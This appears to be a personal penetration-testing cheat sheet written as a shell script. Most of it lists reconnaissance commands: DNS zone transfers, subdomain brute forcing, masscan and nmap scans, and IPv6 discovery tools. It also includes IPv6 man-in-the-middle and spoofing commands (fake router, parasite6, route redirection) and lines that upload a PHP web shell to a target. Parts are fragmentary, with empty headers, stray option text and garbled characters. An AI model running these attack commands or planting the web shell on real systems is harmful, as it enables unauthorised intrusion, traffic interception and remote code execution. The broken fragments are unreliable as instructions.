#!/bin/sh
##-===========================================================-##
##    [+] Xe1phix-[Recon]-[v12.4.52].sh
##-===========================================================-##


##-=========================================-##
##    [+] Automatic Zone Transfer (AXFR)
##-=========================================-##


##-=========================================================-##
##    [+] Incremental Zone Transfers (IXFR)
##-=========================================================-##
## --------------------------------------------------------- ##
##   [?] Incremental zone transfer is a list of changes
## --------------------------------------------------------- ##


ping $Domain
dig -x $Domain
dig -6 AAAA $Domain
nslookup -debug $Domain
nslookup -query=ns $Domain
nslookup -querytype=mx $Domain
nslookup recursive $Domain
nslookup server $Server set type=any ls -d $Domain

                
host -l $Domain
whois $Domain


host -t ns $Domain
nslookup -query=ns $Domain


##-==============================-##
##  [+] Full Zone Transfer (AXFR)
##-==============================-##


dig $Domain -t axfr
host -l $Domain ns1.$Domain
dnsrecon -d $Domain -t axfr
dnsrecon -d $Domain -t axfr @ns1.$Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr @ns1.$Domain

nmap --script=dns-zone-transfer $Domain


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Target		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##


##-==========================================-##
##  [+] Incremental Zone Transfer (IXFR)
##-==========================================-##



##-===========================================-##
##  [+] Metasploit - Reverse DNS (PTR) Scan
##-===========================================-##
msfconsole
> use auxiliary/gather/dns_reverse_lookup
> set RANGE 192.168.1.0/24
> run

> use auxiliary/gather/enum_dns
> use auxiliary/gather/dns



##-=======================-##
##  [+] Query MX records
##-=======================-##
dig -t MX @DNSServer mail.$Domain.com
host -t MX $Domain
nslookup -querytype=mx $Domain
systemd-resolve -t MX $Domain


## -------------------------------------------------------------------------------------- ##
##   [?] SOA - start of authority - Defines the authoritative information about a zone
## -------------------------------------------------------------------------------------- ##
nslookup -querytype=SOA $Domain
dig -t soa $Domain
host -t soa $Domain
## host -C $Domain



dig $Domain ANY +noall +answer
nslookup -query=any $Domain
nslookup -debug $Domain


##-=======================-##
##  [+] DNS Brute Force
##-=======================-##

dnsrecon -t brt,std,axfr -D /pentest/enumeration/dns/dnsrecon/namelist.txt -d $target

nmap -sn -Pn --script dns-brute $IP



##-===========================================-##
##  [+] DNS Brute - Subdomain Enumeration
##-===========================================-##
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done
dnsrecon -d $TARGET -D wordlist.txt -t std --xml output.xml


## ------------------------------------------ ##
##   [?] Show IP addresses of subdomains
## ------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done




Retrieve the MX record of the "yahoo.com" domain

systemd-resolve -t MX 

Retrieve a TLS key ("=tcp" and ":443" could be skipped)

systemd-resolve --tlsa=tcp fedoraproject.org:443


##-==========================-##
##   [+] DNS Zone Walking:
##-==========================-##
dnsrecon -d $Host -t zonewalk




##-==========================================================-##
## ---------------------------------------------------------- ##
##   [+] Autonomous System Number(ASN) + Netblocks Recon
## ---------------------------------------------------------- ##
##-==========================================================-##


##-==================================================-##
##   [+] NMap - Find netblocks that belong to an ASN
##-==================================================-##
nmap --script targets-asn --script-args targets-asn.asn=$ASN


##-===================================================-##
##   [+] NMap - Find Information about IP address
##-===================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


##-========================================-##
##   [+] Find ASN for a given IP address
##-========================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as


http://asnlookup.com/api


##-=================================================================-##
##   [+] Lookup autonomous systems of all outgoing http/s traffic
##-=================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


##-======================================-##
##   [+] hackertarget - ASN Lookup API
##-======================================-##
curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt


##-==============================================-##
##   [+] spyse - Get Autonomous System details
##-==============================================-##
echo "AS15169" | spysecli as


##-====================================-##
##   [+] Block all FaceBook traffic
##-====================================-##
ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done


##-=====================================-##
##     [+] 
##-=====================================-##
amass intel -active -asn $ASN -ip

##-=========================-##
##  [+] DNS Enumeration:
##-=========================-##
##amass enum -v -src -ip -brute -min-for-recursive 2 d $Domain



sniper -t $Domain -o -re



bing-ip2hosts -p $IP
automater -s robtex $IP
dnsmap -w $File.txt $Domain
dnstracer $Domain
sublist3r -d $Domain
subfinder -d $Domain
subjack $Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr
dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
fierce -dns $Domain
dnswalk -r -d $Domain
dnstracer -r 3 -v $Domain

dnsdict6 -4 -d -t 16 -e -x $Domain

massdns -r $Dir/$Resolvers.txt -t A -q -o S $File.txt
dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt


# 1st resolve subdomains on valid websites
##   [?] https://github.com/projectdiscovery/httpx
cat subdomains.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt
##\_____________________/##
##   [?] Clean output:
## --------------------- ##
cat webs_info.txt | cut -d ' ' -f1 | grep ".domain.com" | sort -u > websites.txt


##   [?] https://github.com/projectdiscovery/dnsx
dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt


dnsviz
dnstwist


LinEnum.sh -s -k $Keyword -r $ReportName -e /$Dir/ -t 


httprint -h -s $Domain signatures.txt -P0



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] enumerate DNS information of a domain and to discover non-contiguous ip blocks.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsenum --noreverse -o $File.xml $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] dnswalk is a DNS debugger.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnswalk $Domain
#
dnswalk -r -d $Domain


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsmap $Domain -w /usr/share/wordlists/dnsmap.txt

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] DNSMAP-BULK USAGE EXAMPLE
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
echo "$Domain" >> $File.txt
echo "example.org" >> $File.txt
dnsmap-bulk.sh $File.txt


dnsrecon -d $Domain -D /usr/share/wordlists/dnsmap.txt -t std --xml $File.xml
dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ag


##-==============================================-##
##   [+] Run massdns to determine online hosts
##-==============================================-##
massdns -r $RESOLVERS -q -t A -o -S -w $File.out $File-merged.txt
cat $File.out | awk '{print $1}' | sed 's/\.$//' | sort -u > $File-online.txt


massdns -r $Dir/resolvers.txt -t A -q -o S $File.txt
massdns -r /$Dir/massdns/lists/resolvers.txt -t A -q -o S -w $Dir/massdns.out all.txt



##-============================================================================-##
##   [+] Produce a list of IP addresses corresponding to the target's FQDNs:
##-============================================================================-##
cat $File.out | awk '{split($0,a," "); print a[3]}' | sort | uniq >> $File-FQDNs.txt



massdns -r lists/resolvers.txt -t CNAME all.txt -o S > $File.txt



masscan -p 443 -sS -Pn -n --randomize-hosts -v $line > $File.txt

masscan -p-65535 $(dig +short $Domain) --rate 10000



masscan -p1-65535 $(dig +short $1|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head - --max-rate 1000




knockpy $TARGET --json 1>/dev/null 2>knockpy.tmp
KNOCKPY_REPORT=$(cat knockpy.tmp | grep : | awk -F': ' '{print $2}')
cat $KNOCKPY_REPORT | jq '.found.subdomain[]' | sed 's/"//g' >> knockpy.tmp
echo "  - Found: $(cat knockpy.tmp | wc -l)"


knockpy -w /pentest/lists/dns/namelist.txt $TARGET




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain

dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


atk6-alive6 eth0 -l > /dev/null && atk6-alive6 eth0 > /dev/null && arp-scan -l | head -n -2 | tail -n +3 > arp && ip -6 neigh > neigh && for line in $(cat neigh | cut -d" " -f5 |sort -u); do grep $line arp && grep $line neigh && echo -e '\n';  done; rm arp neigh



##-====================================================-##
##   [+]
##-====================================================-##

ping6 ff02::2%eth0			## all routers address
ping6 ff02::1%eth0			## all nodes address

ping6 ff02::1%eth0
ping6 -c 6 ff02::1%eth0
ping6 –c 4 fe80::c418:2ed0:aead:cbce%eth0


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
inverse_lookup6 eth0 $MAC		## Get IPv6 from a MAC addresses



ICMPv6 Router Discovery




##-==================================================-##
##   [+] atk6-redir6 - IPv6 Evil AP - MITM Attack 
##-==================================================-##
## ----------------------------------------------------------------- ##
##   [?] Implant a route into $SrcIP which;
##   [?] Redirects all traffic from $TargetIP to $NewIP 
## ----------------------------------------------------------------- ##
redir6 eth0 $SrcIP $TargetIP  <original-router> <new-router> $NewRouterMAC


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##


##-=============================================================-##
##   [+] dnsdict6 - Enumerate a domain for DNS Record Entries
##-=============================================================-##
## --------------------------------------------------------------------- ##
##   [?] ENUMERATE SRV SERVICE RECORDS
##   [?] ENUMERATE IPV4 IPV6, NAME SERVER, MAIL SERVER WITH OPTIONS
## --------------------------------------------------------------------- ##
atk6-dnsdict6 $Domain
atk6-dnsdict6 -d $Domain				## NS and MX DNS domain information
atk6-dnsdict6 -S $Domain				## perform SRV service name guessing
atk6-dnsdict6 -d46 -t 32 $Domain		## number of threads




##-====================================================-##
##   [+] Performs reverse DNS enumeration given an IPv6 address.
##-====================================================-##
atk6-dnsrevenum6
atk6-dnsrevenum6 $DNSServer $IPv6Addr/64


##-====================================================-##
##   [+] traceroute that uses ICMP6.
##-====================================================-##
atk6-trace6
atk6-trace6 -d eth0 $TargetIP $Port


##-=======================================================-##
##   [+] Alive6 - Find activities on local network
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] Detect ICMPv6 echo-reply on global addresses
##   [?] Shows  alive addresses in the segment
## ------------------------------------------------------- ##
atk6-alive6 eth0
atk6-alive6 eth0 -v
atk6-alive6 tun6to4

-V         enable debug output
  -d         DNS resolve alive IPv6 addresses
  -H         print hop count of received packets

-i $File

-Z $Mac     ## Use given destination MAC address



##-=============================================================-##
##   [+] detects new ipv6 addresses joining the local network
##-=============================================================-##
atk6-detect-new-ip6 eth0

##-==========================================-##
##   [+] Announce yourself as a router
##   [+] try to become the default router
##-==========================================-##
atk6-fake_router6 eth0 1::/64
atk6-fake_router6 eth0 1::/64 $MTU $MAC


##-=======================================================-##
##   [+] Dumps all local routers and their information
##-=======================================================-##
atk6-dump_router6 eth0


##-===============================================-##
##   [+] Advertise ipv6 address on the network
##-===============================================-##
## ------------------------------------------------------------------------------ ##
##   [?] sending it to the all-nodes multicast address if no target specified.
## ------------------------------------------------------------------------------ ##
atk6-fake_dhcps6 eth0 1::/64 $DNSServer


##-=======================================================-##
##   [+] Dumps all DHCPv6 servers and their information
##-=======================================================-##
atk6-dump_dhcp6 eth0



##-==========================================-##
##   [+] parasite6 - ARP spoofer for IPv6
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] redirecting all local traffic to your own  system
##   [?] by answering falsely to Neighbor Solicitation requests
##   [?] specifying FAKE-MAC results in a local DOS.
## ----------------------------------------------------------------- ##
atk6-parasite6 eth0 $FakeMAC
atk6-parasite6 -l eth0








dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt


dnscan -d $Domain -w $Domains QUICK -o $Dir/domains-dnscan-$Domain.txt





ping $Domain
tcptraceroute -i eth0 $Domain
traceroute -T -O info -i eth0 $Domain
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt
nmap -p 53 --script=*dns* -vv -oN dns $ip
nmap -PN -n -F -T4 -sV -A -oG $File.txt $Domain
amap -d $IP $PORT
cisco-torch -A $IP

hping3 $Domain

fping -a 192.168.0.1-100
bing $IP
oping

mtr $Domain
tcptraceroute -i eth0 $Domain
tracepath $Domain
tcptrace -l -r o3 $File
intrace -h $Domain
itrace -i eth0 -d $Domain
0trace eth0 $Domain
tctrace -i eth0 -d $Domain
tcpflow -p -c -i eth0 port 80
tcpxtract --file $File.pcap --output $File --device eth0
tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"

sniffit
packit
ostinato
firewalk


ifpps -dev eth0
ifpps -lpcd wlan0           ## Continuous terminal output for the wlan0
ifpps -pd eth0              ## eth0 device in promiscuous mode.

iftop -i eth0 -f 'port (80 or 443)'
iftop -i eth0 -f 'ip dst 192.168.1.5'
iftop -i eth0 -F 192.168.1.0/255.255.255.0



##-=======================-##
##  [+] IPv6 Traceroute:
##-=======================-##
traceroute6 $Domain
path6 -v -u 72 -d $Domain		            ## Traceroute EH-enabled
mtr -6 $Domain

traceproto 
tracepath 
tracepath6 $Domain
itrace -v -i eth0 -d $Domain        ## traceroute implementation using ICMP echo request packets
tctrace -v -i eth0 -d $Domain       ## traceroute implementation using TCP SYN packets
tcptraceroute                       ## traceroute implementation using TCP packets.
tcptraceroute -A                    ## Set the TCP ACK flag in outgoing packets.        ## By doing so, it is possible to trace through stateless firewalls which permit outgoing TCP connections.

tcptrace -b                         ## brief output format
tcptrace -l                         ## long output format


arp-scan --interface=eth0 192.168.0.0/24

netdiscover -r $IP
netdiscover -i eth0 -r $IP -s 100 -N -P >> netdiscover.log

crackmapexec 192.168.1.0/24

ndisc6

atk6-trace6 -d eth0 $TargetIP $Port
atk6-alive6 eth0 -v
atk6-detect-new-ip6 eth0
atk6-dump_router6 eth0
atk6-dump_dhcp6 eth0
atk6-passive_discovery6 eth0

script6 get-as $IPv6Addr
script6 get-asn $IPv6Addr
cat $File.txt | script6 get-aaaa



nmap -6 -sT $DOMAIN						## Nmap scan
nmap -6 -sT ::1							## localhost

scan6 -v -i eth0 -­d $DOMAIN/64			## Domain scanning
scan6 -v -i eth0 -­d $IPv6ADDR/64			## Address scanning

scan6 -i eth0 -L -e --print-type global	## Discover global & MAC addresses

scan6 -i eth0 --local-scan --rand-src-addr --verbose		## Link-local & Global addresses :+1:


#targets-ipv6-multicast-echo: Sends ICMPv6 echo to all nodes link local ff02::1 -script-args newtargets,interface=, may need -SL
#targets-ipv6-multicast-invalid-dst: Sends ICMPv6 with invalid extension to all nodes link-local (ff02::1) for Windows responses. --script-args 'newtargets,interface=', may need -sP
#targets-ipv6-multicast-mld: Sends multicast listener discovery to link-local (ff02::1), resp set to 1 to provoke immediate response. --script-args 'newtargets,interface='
nmap -6 -n --script targets-ipv6-multicast-echo,targets-ipv6-multicast-invalid-dst,targets-ipv6-multicast-mld -oA 



gobuster dir -u $Domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
joomscan -u $Domain
nikto -h $Domain -port 443 -Format htm --output $Domain.html
uniscan -u $Domain -qweds
wafw00f $Domain
whatweb $Domain
wpscan --url $Domain

cisco-torch -A 192.168.99.202
copy-router-config.pl 192.168.1.1 192.168.1.15 private
merge-router-config.pl 192.168.1.1 192.168.1.15 private


sslscan $Domain
sslyze $Domain
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain
sslyze -regular $Domain
sslcaudit -l 0.0.0.0:443 -v 1
sslstrip -w sslstrip.log -l 8080
tlssled $Domain 443
testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $IP



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##		[+]  DMitry (Deepmagic Information Gathering Tool)
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dmitry -winsepo $File.txt $Domain


automater -s robtex $IP


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] hping3 - send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
hping3 --traceroute -V -1 $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] InTrace - enumerate IP hops exploiting existing TCP connections
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
intrace -h $Domain -p 80 -s 4


amap -bqv 192.168.1.15 80
amap -bqv1 1-65535 $TARGET



# Metasploit DNS Auxiliarys:
metasploit> use auxiliary/gather/dns

msf > use auxiliary/gather/enum_dns

## ------------------------------------------------------------------------------ ##
##   [?] find zombie ip in network to use them to scan:
## ------------------------------------------------------------------------------ ##
use auxiliary/scanner/ip/ipidseq
nmap -sI ip target



https://github.com/rebootuser/LinEnum



## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t rvs -i 192.1.1.1,192.1.1.20				## Reverse lookup for IP range:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t std -d $Domain.com						## Retrieve standard DNS records:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t brt -d $Domain.com -w $Hosts.txt	## Enumerate subdornains:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Domain.com -t axfr						## DNS zone transfer:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Host -t zonewalk							## Zone Walking
## --------------------------------------------------------------------------------------------------------------- ##



strace ffmpeg -i /dev/video0 $File.jpg



echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3




echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3



## --------------------------- ##
##   [?] follow redirects
##   [?] set user-agent
##   [?] set method - GET
## --------------------------- ##
curl -Iks --location -X GET -A "x-agent" $Domain


## --------------------------------- ##
##   [?] Use Proxy for connection
## --------------------------------- ##
curl -Iks --location -X GET -A "x-agent" --proxy http://127.0.0.1:4444 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:9050 $Domain
curl -Iks --location -X GET -A "x-agent" --proxy socks5://127.0.0.1:1080 $Domain



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Clearnet access via HTTP/SOCKS <<---------------------------------------------||
##-======================================================================================================================================-##
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI -x 127.0.0.1:8118 ${webhost}									## Fetch via HTTP proxy as root
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${webhost}					## Fetch via HTTP proxy as anon
    curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}					## Fetch via SOCKS proxy as root
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}	## Fetch via SOCKS proxy as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI --socks5 127.0.0.1:9050 ${webhost}							## Fetch via SOCKS proxy w/ local DNS as root
    sudo -n -u anon curl -fsSI --socks5 127.0.0.1:9050 ${webhost}			## Fetch via SOCKS proxy w/ local DNS as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

##-======================================================================================================================================-##
##  ||---------------------------------------->> Fetch Over SOCKS5 Using Privoxy And Local DNS <<-------------------------------------||
##-======================================================================================================================================-##
## 
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via privoxy
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via SOCKS5 proxy as privoxy 
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

torify openssl s_client -connect $ONION:$PORT
torify openssl s_client -connect $ONION:$PORT -showcerts
torify openssl s_client -connect $ONION:$PORT -showcerts 2>/dev/null |  openssl x509 -in /dev/stdin -noout -fingerprint |  awk -F'=' '{print $2}' |  tr -d ':'



## ---------------------------------------------- ##
##  [+] Testing connection to the remote host
## ---------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ---------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ---------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## ----------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl cipher
## ----------------------------------------------------------------------- ##
openssl s_client -cipher 'AES128-SHA' -connect $Domain:443





curl --socks5-hostname 127.0.0.1:9050 -o $File $URL
curl --socks5-hostname 127.0.0.1:9150 -o $File $URL


##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy - Secure TLS Cpnnection
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 $URL
curl --proxy "socks5h://localhost:9150" --tlsv1.2 $URL

 - Firefox User Agent 
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL

##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy + TLS + Firefox User Agent 
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL



##-======================================================================================================================================-##
##  ||----------------------------------------------->> Darknet access via HTTP/SOCKS <<----------------------------------------------||
##-======================================================================================================================================-##
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${onionhost}						## Fetch via .onion via HTTP proxy as anon
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${onionhost}		## Fetch .onion via SOCKS proxy as anon
##-======================================================================================================================================-##



##-======================================-##
##   [+] Curl SOCKS5 Proxy Connection:
##-======================================-##
curl -s -m 10 --socks5 $hostport --socks5-hostname $hostport -L $URL


curl --socks5 127.0.0.1:9150
curl --http-proxy=socks4a://127.0.0.1:9050
curl --socks5 127.0.0.1:9150

curl -v --socks5-hostname localhost:9050 http://jhiwjjlqpyawmpjx.onion

curl --resolve 127.0.0.1:4444:http://killyourtv.i2p/killyourtv.asc


curl ifconfig.co --socks5-host 10.64.0.1
curl ifconfig.co --socks5-host nl1-wg.socks5.mullvad.net

curl -sSL https://api.mullvad.net/wg/ -d account="$ACCOUNT" --data-urlencode pubkey="$(wg pubkey <<<"$PRIVATE_KEY")"

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/

curl -LsS https://api.mullvad.net/public/relays/wireguard/v1/ | jq -r ".countries[] | (.code + \" - \" + .name + \" \" + ( .cities[] | (.name + \";\" + (.relays[].hostname / \"-\")[0] + \"-wg.socks5.mullvad.net\" ) )  ) + \":1080\" " | awk '{split($0,a,";"); print a[2] " [SOCKS5] "  "["a[1]"]"}' | sed s/","/" -"/g

wg.socks5.mullvad.net


curl -sSm 10 https://am.i.mullvad.net

curl -sSm 10 --interface wg0 https://am.i.mullvad.net




##-====================================-##
##  [+] Pretend to be a Google Bot
##-====================================-##
curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' $Domain







##-=========================-##
##  [+] Grab HTTP Headers
##-=========================-##
curl -LIN $Domain

curl --trace - --trace-time $Domain

curl -A '' $Domain                          ## Remove the User Agent

curl -A '' -H 'User-Agent;' $Domain         ## Send an Empty User Agent

curl -c cookies.txt $Domain                 ## Save Cookies to a File

curl -b cookies.txt $Domain                 ## Load Cookies from a File



##-=================================-##
##  [+] Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php






##-================================================-##
##  [+] List FTP server contents:
##-================================================-## 
curl -u $FTPUser:$FTPPass -O ftp://$host/$Path/


##-================================================-##
##  [+] Upload a file to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T $Filename ftp://$URL


##-================================================-##
##  [+] Upload multiple files to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T "{$File1,$File2}" ftp://$URL


##-================================================-##
##  [+] Upload a file from STDIN to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T - ftp://$URL/$Path/$Filename






## --------------------------------- ##
##   [+] curl - connection statistics:
## --------------------------------- ##
URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s conn %{time_connect}s time %{time_total}s\nSpeed %{speed_download}bps Size %{size_download}bytes\n" -o/dev/null -s $URL


## ---------------------------------------------- ##
##    [+] Curl - Send email through the gmail API
## ---------------------------------------------- ##
##    [?]  smtp.gmail.com   || port: 465
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt

## ---------------------------------------------------------------- ##
##    [+] Gmail - Check your unread Gmail from the command line
## ---------------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"


## -------------------------------------------------------- ##
##    [+] Gmail - Check   ???   from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*?<name>(.*?)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
curl -u username:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | perl -pe 's/^<title>(.*)<\/title>.*<name>(.*)<\/name>.*$/$2 - $1/'


## -------------------------------------------------------- ##
##    [+] Gmail - Check  ???    from the command line
## -------------------------------------------------------- ##
curl -u username --silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'


## ---------------------------------------------- ##
##   [+] Curl - Fetch an email from GMail:
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt





*************************************************************
 Use SpiderFoot by starting your web browser of choice and 
 browse to http://127.0.0.1:8099
*************************************************************



spiderfoot -l 127.0.0.1:8099
http://127.0.0.1:8099














testssl.sh --add-ca companyCA1.pem,companyCA2.pem <further_cmds>
ADDTL_CA_FILES=companyCA1.pem,companyCA2.pem 
testssl.sh <further_cmds>


keytool -list -rfc -keystore lib/security/cacerts | grep -E -v '^$|^\*\*\*\*\*|^Entry |^Creation |^Alias '


##-============================================================-##
##   [+] pull all certificates from Windows Update services:
##-============================================================-##
CertUtil -syncWithWU -f -f


http://aka.ms/RootCertDownload
https://technet.microsoft.com/en-us/library/dn265983(v=ws.11).aspx#BKMK_CertUtilOptions). 

## ------------------------------------------ ##
##   [?] They are in DER format
##   [?] Convert them using the following:
## ------------------------------------------ ##

for f in *.cer; do echo $f >/dev/stderr; openssl x509 -in $f -inform DER -outform PEM ;done >/tmp/Microsoft.pem






# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v

##PUTing File on the Webhost via PUT verb

curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php








##-===========================================-##
##   [+] Bulk Download Files By Their URLs
##-===========================================-##
## ------------------------------------------------ ##
##   [?] The URL Links Are Fed To Curl From xarg
## ------------------------------------------------ ##
xargs -n 1 curl -O < $File


##-=================================================-##
##   [+] Recursively fetch list of URLs with wget:
##-=================================================-##
cat $URLList.txt | xargs wget ???c


## ------------------------------------------ ##
##   [?] Pipe an IP address list into NMap
